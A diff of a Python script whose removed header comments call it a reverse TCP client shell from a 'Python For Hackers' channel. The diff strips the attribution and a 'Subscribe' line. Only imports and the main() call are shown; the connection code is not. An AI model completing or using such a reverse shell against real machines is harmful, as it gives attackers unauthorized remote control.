@@ -1,6 +1,3 @@
-# Python For Hackers - Priyank Gada
-#www.youtube.com/priyankgada
-# Reverse TCP Client Side Shell by Priyank Gada
 import socket 
 import subprocess 
 import os   #NEW IMPORT ... FILE OPERATION
@@ -63,15 +60,6 @@ def connect():
 def main ():
     connect()
 main()
-
-#end :) Subscribe to my channel
-
-
-
-
-
-
-
 
 
 
